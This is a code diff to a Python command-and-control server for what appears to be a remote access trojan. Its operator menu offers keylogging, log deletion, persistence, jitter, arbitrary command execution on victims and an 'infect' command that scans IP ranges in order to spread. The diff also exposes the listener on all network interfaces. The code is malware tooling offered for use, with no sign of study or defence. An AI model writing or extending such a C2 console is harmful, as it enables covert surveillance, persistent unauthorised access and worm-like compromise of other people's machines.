@@ -1,21 +1,20 @@
 import socket
-import sys
+import time
 
 def display_menu():
     print("\nCommand Menu:")
     print("1. cd [path]")
-    print("2. keylog")
+    print("2. keylog || [stop_keylogger, log, delete_log]")
     print("3. persist")
-    print("4. hibernate")
-    print("5. jitter")
-    print("6. infect <network_prefix> <target_port> <start_ip> <end_ip>")
-    print("7. q")
+    print("4. jitter")
+    print("5. infect <network_prefix> <target_port> <start_ip> <end_ip>")
+    print("6. q")
     print("Enter custom commands to execute directly on client.\n")
 
 def setup_server():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_address = ('127.0.0.1', 50000)
+    server_address = ('0.0.0.0', 50000)
     sock.bind(server_address)
     sock.listen(5)
     print("Server is listening on port 50000...")
@@ -41,7 +40,9 @@ def handle_client(client_socket, client_address):
             receive_response(client_socket)
 
 def receive_response(client_socket):
+    """Nhận phản hồi từ client"""
     try:
+        time.sleep(3)
         response = client_socket.recv(4096).decode()
         if not response:
             print("Client disconnected.")
